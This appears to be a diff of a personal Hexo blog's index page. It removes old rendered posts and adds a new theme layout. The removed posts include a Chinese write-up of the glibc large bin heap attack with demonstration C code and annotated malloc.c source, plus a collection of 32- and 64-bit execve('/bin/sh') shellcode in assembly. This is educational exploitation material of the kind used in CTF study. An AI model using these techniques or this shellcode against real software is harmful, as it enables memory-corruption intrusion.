@@ -1,1245 +1,594 @@
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="en">
+<html lang=en>
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="Hexo, NexT" />
-
-
-
-
-
-
-
-
-
-
-<meta property="og:type" content="website">
+  <title>Hexo</title>
+  <meta property="og:type" content="website">
 <meta property="og:title" content="A4x7eq28&#39;Blog">
 <meta property="og:url" content="http://www.4x7.fun/index.html">
 <meta property="og:site_name" content="A4x7eq28&#39;Blog">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="A4x7eq28">
 <meta name="twitter:card" content="summary">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '',
-    scheme: 'Pisces',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://www.4x7.fun/"/>
-
-
-
-
-
-  <title>A4x7eq28'Blog</title>
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://www.4x7.fun/index.html">
   
+    <link rel="alternate" href="/atom.xml" title="A4x7eq28&#39;Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
-
-
-
-
-
-
-
+  
+  
+  
+  
 <meta name="generator" content="Hexo 6.1.0"></head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="en">
 
-  
-  
-    
-  
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/cofess" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">昵称</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Web Developer &amp; Designer</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
 
-  <div class="container sidebar-position-left 
-  page-home">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">A4x7eq28'Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
     </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
   </div>
 </div>
 
-<nav class="site-nav">
-  
 
-  
-    <ul id="menu" class="menu">
-      
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
         
         <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
+          <a href="/.">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            <i class="icon icon-home-fill"></i>
             
-            Home
+            <span class="menu-title">Home</span>
           </a>
         </li>
-      
         
-        <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            About
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            Tags
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            Categories
-          </a>
-        </li>
-      
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
+          <a href="/archives">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            <i class="icon icon-archives-fill"></i>
             
-            Archives
+            <span class="menu-title">Archives</span>
           </a>
         </li>
-      
-
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            <i class="icon icon-folder"></i>
             
-            Search
+            <span class="menu-title">Categories</span>
           </a>
         </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
       
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/cofess" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
     </ul>
-  
+
+    </nav>
+  </div>
+</header>
 
   
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="Searching..." spellcheck="false"
-             type="text" id="local-search-input">
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
     </div>
-  </div>
-  <div id="local-search-result"></div>
 </div>
 
-
-
-    </div>
-  
-</nav>
-
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-  <section id="posts" class="posts-expand">
     
       
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.4x7.fun/2022/03/23/HeapAttack-LargeBinAttack/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A4x7eq28'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2022/03/23/HeapAttack-LargeBinAttack/" itemprop="url">HeapAttack:LargeBinAttack</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-23T21:16:30+08:00">
-                2022-03-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/HeapAttack/" itemprop="url" rel="index">
-                    <span itemprop="name">HeapAttack</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="1-漏洞样式"><a href="#1-漏洞样式" class="headerlink" title="1. 漏洞样式"></a>1. 漏洞样式</h2><ul>
-<li>漏洞要求：Write After Free</li>
-<li>内存大小：可申请 large bin(即size&gt;&#x3D;0x400)</li>
-</ul>
-<h2 id="2-利用方法"><a href="#2-利用方法" class="headerlink" title="2. 利用方法"></a>2. 利用方法</h2><h3 id="2-1-攻击效果"><a href="#2-1-攻击效果" class="headerlink" title="2.1 攻击效果"></a>2.1 攻击效果</h3><p>在unsorted-bin chunk被sort进large-bin时，触发<em><strong>任意地址写</strong></em>, 可以往<em><strong>任意地址</strong></em>中写入一个不可控的未知<em><strong>大数</strong></em> (实际为<em><strong>某堆地址</strong></em>)。<br>实现以下目的：</p>
-<ul>
-<li>修改循环次数</li>
-<li>修改global_max_fast 或arena-&gt;max_fast的值，从而把size&gt;0x80的chunk分配到fastbin中;或者在目标二进制使用mallopt(M_MXFAST,0)禁用fastbin后，重新启用</li>
-<li>修改能够输出的变量，从而泄露堆地址</li>
-</ul>
-<h3 id="2-2-过程简述"><a href="#2-2-过程简述" class="headerlink" title="2.2 过程简述"></a>2.2 过程简述</h3><p>假设堆状态如下：</p>
-<pre><code>unsorted-bin: A(0x400)
-large-bin: 
-0x400： B(0x410) 
-</code></pre>
-<p>若 <strong>B</strong> 存在Write After Free, 则修改 <em><strong>B-&gt;bk_nextsize</strong></em> 为 <em><strong>目标地址(target)</strong></em> 。<br>触发A加入到large-bin链表中，则会导致 <em><strong>A-&gt;bk_nextsize &#x3D; B-&gt;bk_nextsize; A-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; B</strong></em> 即 <em><strong>target-&gt;fd_nextsize &#x3D; A</strong></em> 。 </p>
-<p>即 </p>
-<pre><code>unsorted-bin: 
-large-bin:
-0x400: B(0x410) -&gt; A(0x400) [A插入时触发攻击]
-</code></pre>
-<h3 id="2-3-代码表示"><a href="#2-3-代码表示" class="headerlink" title="2.3 代码表示"></a>2.3 代码表示</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">static uint64_t target; //假设需要被更改值的目标地址</span><br><span class="line">int attack()&#123;</span><br><span class="line">    void* A, * B, * C;</span><br><span class="line"></span><br><span class="line">    A = malloc(0x400 - 8); //A小</span><br><span class="line">    malloc(0x18);</span><br><span class="line">    B = malloc(0x410 - 8); //B大</span><br><span class="line">    malloc(0x18);</span><br><span class="line"></span><br><span class="line">    free(B);</span><br><span class="line">    // unsortedbin: B</span><br><span class="line">    // largebin: empty</span><br><span class="line"></span><br><span class="line">    malloc(0x600);</span><br><span class="line">    // unsortedbin: empty</span><br><span class="line">    // largebin: 0x400: B(0x410)</span><br><span class="line"></span><br><span class="line">    free(A)；</span><br><span class="line">    // unsortedbin: A</span><br><span class="line">    // largebin: 0x400: B(0x410)</span><br><span class="line"></span><br><span class="line">    * ( uint64_t * )(B + 0x18) = ( uint64_t ) ( &amp;target ) - 0x20</span><br><span class="line">    //edit: B-&gt;bk_nextsize = target_over  &amp;&amp; let: target_over-&gt;fd_nextsize = target</span><br><span class="line"></span><br><span class="line">    malloc(0x600);</span><br><span class="line">    // unsortedbin: empty</span><br><span class="line">    // largebin: 0x400: B(0x410)-&gt;A(0x400) &#123;触发：A-&gt;bk_nextsize-&gt;fd_nextsize = A&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="3-原理分析"><a href="#3-原理分析" class="headerlink" title="3. 原理分析"></a>3. 原理分析</h2><p>在glibc项目malloc.c文件_int_malloc函数中：<br>在chunk被从unsortedbin中sort下来之后的代码部分</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">. . . </span><br><span class="line">          /* place chunk in bin */</span><br><span class="line">          //// 若smallbin范围</span><br><span class="line">          if (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          else ////若在largebin范围</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">              //// largebin:: [bck]: fwd</span><br><span class="line">              /* maintain large bins in sorted order * /</span><br><span class="line">              if (fwd != bck) //// largebin不为空</span><br><span class="line">                &#123;</span><br><span class="line">                  /* Or with inuse bit to speed comparisons */</span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  /* if smaller than smallest, bypass loop below */</span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  if ((unsigned long) (size)</span><br><span class="line">		      &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) ////确认victim为最小，因此插入到链表最后</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line">                      //// largebin:: [fwd]: bck</span><br><span class="line">                      //// 等同于2节例子中：[av]: B </span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd; ////fwd-&gt;fd 即为bck,也就是例子里的B</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; //// 因此victim-&gt;bk_nextsize = bck-&gt;bk_nextsize (即A-&gt;bk_nextsize = B-&gt;bk_nextsize)</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"> ////即bck-&gt;bk_nextsize = bck-&gt;bk_nextsize-&gt;fd_nextsize = victim</span><br><span class="line"> ////即例子：B-&gt;bk_nextsize = B-&gt;bk_nextsize-&gt;fd_nextsize = A</span><br><span class="line"> ////==&gt; largebin attack的精髓即：B-&gt;bk_nextsize-&gt;fd_nextsize = A， </span><br><span class="line"> ////==&gt; 而它通过两步计算得到：victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; 和 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/largebin_attack.c">heap_exploit_2.31&#x2F;largebin_attack.c</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.4x7.fun/2022/03/21/shellcode/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A4x7eq28'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2022/03/21/shellcode/" itemprop="url">Shellcode Collection</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-21T20:44:19+08:00">
-                2022-03-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/shellcode/" itemprop="url" rel="index">
-                    <span itemprop="name">shellcode</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><p>有”\x00”最短 20 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode= &#x27;&#x27;&#x27;            </span><br><span class="line">xor ecx,ecx               </span><br><span class="line">mul ecx                   </span><br><span class="line">mov al,0xb                </span><br><span class="line">push 0x68732f             </span><br><span class="line">push 0x6e69622f           </span><br><span class="line">mov ebx,esp               </span><br><span class="line">int 0x80                  </span><br><span class="line">&#x27;&#x27;&#x27;                       </span><br><span class="line">shellcode=asm(shellcode)</span><br></pre></td></tr></table></figure>
-<p>无”\x00”最短 21 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">mul ecx</span><br><span class="line">push eax</span><br><span class="line">mov al,0xb</span><br><span class="line">push 0x68732f2f   </span><br><span class="line">push 0x6e69622f   </span><br><span class="line">mov ebx,esp</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-<p>标准shellcode 23 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">push edx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xB</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-<h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>最短有”\x00” 22 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">mov rbx,0x68732f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<p>最短无”\x00” 23 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">push rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<p>标准shellcode 31 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xor    rdi,rdi</span><br><span class="line">xor    rsi,rsi</span><br><span class="line">xor    rdx,rdx</span><br><span class="line">xor    rax,rax</span><br><span class="line">push   rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push   rbx</span><br><span class="line">mov    rdi,rsp</span><br><span class="line">mov    al,0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-
-<h3 id="转载自"><a href="#转载自" class="headerlink" title="转载自:"></a>转载自:</h3><p><a target="_blank" rel="noopener" href="https://b0ldfrev.gitbook.io/note/pwn/linux_shellcode">Linux_ShellCode</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.4x7.fun/2022/03/18/HeapAttack-House-of-Botcake/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A4x7eq28'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2022/03/18/HeapAttack-House-of-Botcake/" itemprop="url">HeapAttack:House_of_Botcake</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-18T20:16:10+08:00">
-                2022-03-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/HeapAttack-tcache/" itemprop="url" rel="index">
-                    <span itemprop="name">HeapAttack, tcache</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="1-漏洞样式"><a href="#1-漏洞样式" class="headerlink" title="1. 漏洞样式"></a>1. 漏洞样式</h2><ul>
-<li>glibc版本：≥ 2.3.1</li>
-<li>Tcache：开启</li>
-<li>漏洞要求：double free</li>
-</ul>
